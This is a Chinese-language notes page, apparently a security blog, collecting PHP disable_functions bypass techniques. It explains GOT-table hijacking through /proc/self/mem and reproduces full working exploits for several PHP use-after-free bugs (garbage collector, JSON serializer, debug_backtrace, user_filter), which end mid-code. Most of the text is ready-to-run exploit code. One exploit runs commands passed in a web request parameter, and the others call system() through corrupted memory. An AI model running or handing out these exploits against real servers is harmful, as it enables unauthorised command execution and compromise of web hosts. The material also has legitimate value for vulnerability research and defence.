---
title: "disable_function bypass"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:38:10+08:00
draft: false
---

## 劫持 got 表 {#劫持-got-表}

关于 got 表可以参考：[深入理解GOT表和PLT表](https://zhuanlan.zhihu.com/p/130271689)

在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程
序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。

简单说就是，函数第一次用到的时候才会把在自己的真实地址给写到相应的 got 表里，没用
到就不绑定了。这就是延迟绑定，由于这个机制，第一次调用函数的时候，got 表中“存放”
的地址不是函数的真实地址，而是 plt 表中的第二条汇编指令，接下来会进行一系列操作装
载相应的动态链接库，将函数的真实地址写在 got 表中。以后调用该函数时，got 表保存着其
真实地址。

这里劫持 got 表就是修改函数的 got 表的地址的内容为我们的 shellcode 的地址：

1.  通过 php 脚本解析 `/proc/self/exe` 得到 open 函数的 got 表的地址
2.  通过读取 `/proc/self/maps` 得到程序基地址，栈地址，与 libc 基地址
3.  通过 php 脚本解析 libc 得到 system 函数的偏移地址，结合 libc 基地址（两者相加）可以得
    到 system 函数的实际地址
4.  通过读写 `/proc/self/mem` 实现修改 open 函数的 got 表的地址的内容为我们的 shellcode
    的地址。向我们指定的 shellcode 的地址写入我们的 shellcode

exp（命令无回显，如果没有权限读写 `/proc/self/mem` ，自然也就无法利用了）

```php
<?php
/* section tables type */
define('SHT_NULL',0);
define('SHT_PROGBITS',1);
define('SHT_SYMTAB',2);
define('SHT_STRTAB',3);
define('SHT_RELA',4);
define('SHT_HASH',5);
define('SHT_DYNAMIC',6);
define('SHT_NOTE',7);
define('SHT_NOBITS',8);
define('SHT_REL',9);
define('SHT_SHLIB',10);
define('SHT_DNYSYM',11);
define('SHT_INIT_ARRAY',14);
define('SHT_FINI_ARRAY',15);
//why does section tables have so many fuck type
define('SHT_GNU_HASH',0x6ffffff6);
define('SHT_GNU_versym',0x6fffffff);
define('SHT_GNU_verneed',0x6ffffffe);


class elf{
    private $elf_bin;
    private $strtab_section=array();
    private $rel_plt_section=array();
    private $dynsym_section=array();
    public $shared_librarys=array();
    public $rel_plts=array();
    public function getElfBin()
{
        return $this->elf_bin;
    }
    public function setElfBin($elf_bin)
{
        $this->elf_bin = fopen($elf_bin,"rb");
    }
    public function unp($value)
{
        return hexdec(bin2hex(strrev($value)));
    }
    public function get($start,$len){

        fseek($this->elf_bin,$start);
        $data=fread ($this->elf_bin,$len);
        rewind($this->elf_bin);
        return $this->unp($data);
    }
    public function get_section($elf_bin=""){
        if ($elf_bin){
            $this->setElfBin($elf_bin);
        }
        $this->elf_shoff=$this->get(0x28,8);
        $this->elf_shentsize=$this->get(0x3a,2);
        $this->elf_shnum=$this->get(0x3c,2);
        $this->elf_shstrndx=$this->get(0x3e,2);
        for ($i=0;$i<$this->elf_shnum;$i+=1){
            $sh_type=$this->get($this->elf_shoff+$i*$this->elf_shentsize+4,4);
            switch ($sh_type){
                case SHT_STRTAB:
                    $this->strtab_section[$i]=
                        array(
                            'strtab_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),
                            'strtab_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8)
                        );
                    break;

                case SHT_RELA:
                    $this->rel_plt_section[$i]=
                        array(
                            'rel_plt_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),
                            'rel_plt_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8),
                            'rel_plt_entsize'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+56,8)
                        );
                    break;
                case SHT_DNYSYM:
                    $this->dynsym_section[$i]=
                        array(
                            'dynsym_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),
                            'dynsym_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8),
                            'dynsym_entsize'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+56,8)
                        );
                    break;

                case SHT_NULL:
                case SHT_PROGBITS:
                case SHT_DYNAMIC:
                case SHT_SYMTAB:
                case SHT_NOBITS:
                case SHT_NOTE:
                case SHT_FINI_ARRAY:
                case SHT_INIT_ARRAY:
                case SHT_GNU_versym:
                case SHT_GNU_HASH:
                     break;

                default:
 //                   echo "who knows what $sh_type this is? ";

              }
          }
     }
    public function get_reloc(){
        $rel_plts=array();
        $dynsym_section= reset($this->dynsym_section);
        $strtab_section=reset($this->strtab_section);
        foreach ($this->rel_plt_section as $rel_plt ){
             for ($i=$rel_plt['rel_plt_offset'];$i<$rel_plt['rel_plt_offset']+$rel_plt['rel_plt_size'];$i+=$rel_plt['rel_plt_entsize'])
             {
                $rel_offset=$this->get($i,8);
                $rel_info=$this->get($i+8,8)>>32;
                $fun_name_offset=$this->get($dynsym_section['dynsym_offset']+$rel_info*$dynsym_section['dynsym_entsize'],4);
                $fun_name_offset=$strtab_section['strtab_offset']+$fun_name_offset-1;
                $fun_name='';
                while ($this->get(++$fun_name_offset,1)!=""){
                    $fun_name.=chr($this->get($fun_name_offset,1));
                }
                $rel_plts[$fun_name]=$rel_offset;
            }
        }
        $this->rel_plts=$rel_plts;
    }
    public function get_shared_library($elf_bin=""){
        if ($elf_bin){
            $this->setElfBin($elf_bin);
        }
        $shared_librarys=array();
        $dynsym_section=reset($this->dynsym_section);
        $strtab_section=reset($this->strtab_section);
        for($i=$dynsym_section['dynsym_offset']+$dynsym_section['dynsym_entsize'];$i<$dynsym_section['dynsym_offset']+$dynsym_section['dynsym_size'];$i+=$dynsym_section['dynsym_entsize'])
        {
            $shared_library_offset=$this->get($i+8,8);
            $fun_name_offset=$this->get($i,4);
            $fun_name_offset=$fun_name_offset+$strtab_section['strtab_offset']-1;
            $fun_name='';
            while ($this->get(++$fun_name_offset,1)!=""){
                $fun_name.=chr($this->get($fun_name_offset,1));
            }
            $shared_librarys[$fun_name]=$shared_library_offset;
         }
         $this->shared_librarys=$shared_librarys;
   }
   public function close(){
       fclose($this->elf_bin);
   }

   public function __destruct()
   {
       $this->close();
   }
   public function packlli($value) {
       $higher = ($value & 0xffffffff00000000) >> 32;
       $lower = $value & 0x00000000ffffffff;
       return pack('V2', $lower, $higher);
   }
}
$test=new elf();
$test->get_section('/proc/self/exe');
$test->get_reloc();  // 获得各函数的 got 表的地址
$open_php=$test->rel_plts['open'];
$maps = file_get_contents('/proc/self/maps');
preg_match('/(\w+)-(\w+)\s+.+\[stack]/', $maps, $stack);
preg_match('/(\w+)-(\w+).*?libc-/',$maps,$libcgain);
$libc_base = "0x".$libcgain[1];
echo "Libc base: ".$libc_base."\n";
echo "Stack location: ".$stack[1]."\n";
$array_tmp = explode('-',$maps);
$pie_base = hexdec("0x".$array_tmp[0]);
echo "PIE base: ".$pie_base."\n";
$test2=new elf();
$test2->get_section('/usr/lib64/libc-2.17.so');
$test2->get_reloc();
$test2->get_shared_library();  // 解析 libc 库，得到 libc 库函数的相对地址
$sys = $test2->shared_librarys['system'];
$sys_addr = $sys + hexdec($libc_base);
echo "system addr:".$sys_addr."\n";
$mem = fopen('/proc/self/mem','wb');
$shellcode_loc = $pie_base + 0x2333;
fseek($mem,$open_php);
fwrite($mem,$test->packlli($shellcode_loc));
$command=$_GET['cmd'];  // 我们要执行的命令
$stack=hexdec("0x".$stack[1]);
fseek($mem, $stack);
fwrite($mem, "{$command}\x00");
$cmd = $stack;
$shellcode = "H\xbf".$test->packlli($cmd)."H\xb8".$test->packlli($sys_addr)."P\xc3";
fseek($mem,$shellcode_loc);
fwrite($mem,$shellcode);
readfile('zxhy');
// highlight_file('zxhy');
// show_source('zxhy');
// file_get_contents('zxhy');
exit();
```


## 利用 GC UAF {#利用-gc-uaf}

此漏洞利用 PHP 垃圾收集器中一个三年前的[bug](https://bugs.php.net/bug.php?id=72530)来绕过 disable_functions 并执行系统命
令

exp：<https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php>

```php
<?php

# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=72530
#
# This exploit should work on all PHP 7.0-7.3 versions
#
# Author: https://github.com/mm0r1

pwn("uname -a");

function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;

        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);

    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);

    exit();
}
```


## 利用 Json Serializer UAF {#利用-json-serializer-uaf}

此漏洞利用 json 序列化程序中的释放后使用[漏洞](https://bugs.php.net/bug.php?id=77843)，利用 json 序列化程序中的堆溢出触发，以
绕过 disable_functions 和执行系统命令

-   Linux 操作系统
-   PHP7.1 - all versions to date
-   PHP7.2 &lt; 7.2.19 (released: 30 May 2019)
-   PHP7.3 &lt; 7.3.6 (released: 30 May 2019)

exp：<https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php>

```php
<?php

$cmd = "id";

$n_alloc = 10; # increase this value if you get segfaults

class MySplFixedArray extends SplFixedArray {
    public static $leak;
}

class Z implements JsonSerializable {
    public function write(&$str, $p, $v, $n = 8) {
      $i = 0;
      for($i = 0; $i < $n; $i++) {
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8;
      }
    }

    public function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    public function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    # unable to leak ro segments
    public function leak1($addr) {
        global $spl1;

        $this->write($this->abc, 8, $addr - 0x10);
        return strlen(get_class($spl1));
    }

    # the real deal
    public function leak2($addr, $p = 0, $s = 8) {
        global $spl1, $fake_tbl_off;

        # fake reference zval
        $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted
        $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval
        $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)

        $leak = strlen($spl1::$leak);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }

        return $leak;
    }

    public function parse_elf($base) {
        $e_type = $this->leak2($base, 0x10, 2);

        $e_phoff = $this->leak2($base, 0x20);
        $e_phentsize = $this->leak2($base, 0x36, 2);
        $e_phnum = $this->leak2($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = $this->leak2($header, 0, 4);
            $p_flags = $this->leak2($header, 4, 4);
            $p_vaddr = $this->leak2($header, 0x10);
            $p_memsz = $this->leak2($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    public function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = $this->leak2($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = $this->leak2($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = $this->leak2($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = $this->leak2($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    public function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = $this->leak2($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    public function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->leak2($addr);
            $f_name = $this->leak2($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return $this->leak2($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    public function jsonSerialize() {
        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;

        $contiguous = [];
        for($i = 0; $i < $n_alloc; $i++)
            $contiguous[] = new DateInterval('PT1S');

        $room = [];
        for($i = 0; $i < $n_alloc; $i++)
            $room[] = new Z();

        $_protector = $this->ptr2str(0, 78);

        $this->abc = $this->ptr2str(0, 79);
        $p = new DateInterval('PT1S');

        unset($y[0]);
        unset($p);

        $protector = ".$_protector";

        $x = new DateInterval('PT1S');
        $x->d = 0x2000;
        $x->h = 0xdeadbeef;
        # $this->abc is now of size 0x2000

        if($this->str2ptr($this->abc) != 0xdeadbeef) {
            die('UAF failed.');
        }

        $spl1 = new MySplFixedArray();
        $spl2 = new MySplFixedArray();

        # some leaks
        $class_entry = $this->str2ptr($this->abc, 0x120);
        $handlers = $this->str2ptr($this->abc, 0x128);
        $php_heap = $this->str2ptr($this->abc, 0x1a8);
        $abc_addr = $php_heap - 0x218;

        # create a fake class_entry
        $fake_obj = $abc_addr;
        $this->write($this->abc, 0, 2); # type
        $this->write($this->abc, 0x120, $abc_addr); # fake class_entry

        # copy some of class_entry definition
        for($i = 0; $i < 16; $i++) {
            $this->write($this->abc, 0x10 + $i * 8,
                $this->leak1($class_entry + 0x10 + $i * 8));
        }

        # fake static members table
        $fake_tbl_off = 0x70 * 4 - 16;
        $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);
        $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);

        # fake zval_reference
        $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval
        $this->write($this->abc, $fake_tbl_off + 8, 10); # zval type (reference)

        # look for binary base
        $binary_leak = $this->leak2($handlers + 0x10);
        if(!($base = $this->get_binary_base($binary_leak))) {
            die("Couldn't determine binary base address");
        }

        # parse elf header
        if(!($elf = $this->parse_elf($base))) {
            die("Couldn't parse ELF");
        }

        # get basic_functions address
        if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {
            die("Couldn't get basic_functions address");
        }

        # find system entry
        if(!($zif_system = $this->get_system($basic_funcs))) {
            die("Couldn't get zif_system address");
        }

        # copy hashtable offsetGet bucket
        $fake_bkt_off = 0x70 * 5 - 16;

        $function_data = $this->str2ptr($this->abc, 0x50);
        for($i = 0; $i < 4; $i++) {
            $this->write($this->abc, $fake_bkt_off + $i * 8,
                $this->leak2($function_data + 0x40 * 4, $i * 8));
        }

        # create a fake bucket
        $fake_bkt_addr = $abc_addr + $fake_bkt_off;
        $this->write($this->abc, 0x50, $fake_bkt_addr);
        for($i = 0; $i < 3; $i++) {
            $this->write($this->abc, 0x58 + $i * 4, 1, 4);
        }

        # copy bucket zval
        $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);
        for($i = 0; $i < 12; $i++) {
            $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8,
                $this->leak2($function_zval, $i * 8));
        }

        # pwn
        $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);
        $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);

        $spl1->offsetGet($cmd);

        exit();
    }
}

$y = [new Z()];
json_encode([&$y]);
```


## Backtrace UAF {#backtrace-uaf}

该漏洞利用在 `debug_backtrace()` 函数中使用了两年的一个 bug。我们可以诱使它返回对
已被破坏的变量的引用，从而导致释放后使用漏洞

-   Linux 操作系统
-   PHP7.0 - all versions to date
-   PHP7.1 - all versions to date
-   PHP7.2 - all versions to date
-   PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)
-   PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)

exp：<https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php>

```php
<?php

# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=76047
# debug_backtrace() returns a reference to a variable
# that has been destroyed, causing a UAF vulnerability.
#
# This exploit should work on all PHP 7.0-7.4 versions
# released as of 30/01/2020.
#
# Author: https://github.com/mm0r1

pwn("uname -a");

function pwn($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() {
            global $backtrace;
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle(str_repeat('A', 79));

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);
    exit();
}
```


## 利用 user_filter {#利用-user-filter}

此漏洞利用了 10 多年前报告的[bug](https://bugs.php.net/bug.php?id=54350)

-   5.\* - exploitable with minor changes to the PoC
-   7.0 - all versions to date
-   7.1 - all versions to date
-   7.2 - all versions to date
-   7.3 - all versions to date
-   7.4 &lt; 7.4.26
-   8.0 &lt; 8.0.13

exp：<https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php>

```php
<?php
# PHP 7.0-8.0 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=54350
#
# This exploit should work on all PHP 7.0-8.0 versions
# released as of 2021-10-06
#
# Author: https://github.com/mm0r1

pwn('uname -a');

function pwn($cmd) {
    define('LOGGING', false);
    define('CHUNK_DATA_SIZE', 0x60);
    define('CHUNK_SIZE', ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);
    define('FILTER_SIZE', ZEND_DEBUG_BUILD ? 0x70 : 0x50);
    define('STRING_SIZE', CHUNK_DATA_SIZE - 0x18 - 1);
    define('CMD', $cmd);
    for($i = 0; $i < 10; $i++) {
        $groom[] = Pwn::alloc(STRING_SIZE);
    }
    stream_filter_register('pwn_filter', 'Pwn');
    $fd = fopen('php://memory', 'w');
    stream_filter_append($fd,'pwn_filter');
    fwrite($fd, 'x');
}

class Helper { public $a, $b, $c; }
class Pwn extends php_user_filter {
    private $abc, $abc_addr;
    private $helper, $helper_addr, $helper_off;
    private $uafp, $hfp;

    public function filter($in, $out, &$consumed, $closing) {
        if($closing) return;
        stream_bucket_make_writeable($in);
        $this->filtername = Pwn::alloc(STRING_SIZE);
        fclose($this->stream);
        $this->go();
        return PSFS_PASS_ON;
    }

    private function go() {
        $this->abc = &$this->filtername;

        $this->make_uaf_obj();

        $this->helper = new Helper;
        $this->helper->b = function($x) {};

        $this->helper_addr = $this->str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;
        $this->log("helper @ 0x%x", $this->helper_addr);

        $this->abc_addr = $this->helper_addr - CHUNK_SIZE;
        $this->log("abc @ 0x%x", $this->abc_addr);

        $this->helper_off = $this->helper_addr - $this->abc_addr - 0x18;

        $helper_handlers = $this->str2ptr(CHUNK_SIZE);
        $this->log("helper handlers @ 0x%x", $helper_handlers);

        $this->prepare_leaker();

        $binary_leak = $this->read($helper_handlers + 8);
        $this->log("binary leak @ 0x%x", $binary_leak);
        $this->prepare_cleanup($binary_leak);

        $closure_addr = $this->str2ptr($this->helper_off + 0x38);
        $this->log("real closure @ 0x%x", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        $this->log("closure class_entry @ 0x%x", $closure_ce);

        $basic_funcs = $this->get_basic_funcs($closure_ce);
        $this->log("basic_functions @ 0x%x", $basic_funcs);

        $zif_system = $this->get_system($basic_funcs);
        $this->log("zif_system @ 0x%x", $zif_system);

        $fake_closure_off = $this->helper_off + CHUNK_SIZE * 2;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->write($fake_closure_off + 0x38, 1, 4);

        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->write($fake_closure_off + $handler_offset, $zif_system);

        $fake_closure_addr = $this->helper_addr + $fake_closure_off - $this->helper_off;
        $this->write($this->helper_off + 0x38, $fake_closure_addr);
        $this->log("fake closure @ 0x%x", $fake_closure_addr);

        $this->cleanup();
        ($this->helper->b)(CMD);
    }

    private function make_uaf_obj() {
        $this->uafp = fopen('php://memory', 'w');
        fwrite($this->uafp, pack('QQQ', 1, 0, 0xDEADBAADC0DE));
        for($i = 0; $i < STRING_SIZE; $i++) {
